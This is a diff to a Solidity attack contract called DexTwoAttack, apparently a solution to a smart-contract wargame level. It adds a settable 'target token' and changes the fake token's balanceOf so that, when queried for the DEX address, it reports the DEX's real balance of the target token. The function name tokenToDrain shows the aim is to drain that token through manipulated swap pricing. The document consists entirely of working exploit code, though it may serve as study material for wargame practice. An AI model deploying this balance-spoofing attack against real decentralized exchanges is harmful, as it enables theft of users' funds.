@@ -6,6 +6,7 @@ import "@openzeppelin/token/ERC20/ERC20.sol";
 
 contract DexTwoAttack is ERC20 {
     address dexAddress;
+    address targetToken;
 
     constructor(address _dexAddress, address _playerAddress) ERC20("DexTwoAttack", "D2A") {
         _mint(_playerAddress, 1000069);
@@ -20,9 +21,13 @@ contract DexTwoAttack is ERC20 {
         // do nothing lol
     }
 
+    function tokenToDrain(address _targetToken) public {
+        targetToken = _targetToken;
+    }
+
     function balanceOf(address account) public view override returns (uint256) {
         if (account == dexAddress) {
-            return 90;
+            return IERC20(targetToken).balanceOf(account);
         }
         return super.balanceOf(account);
     }
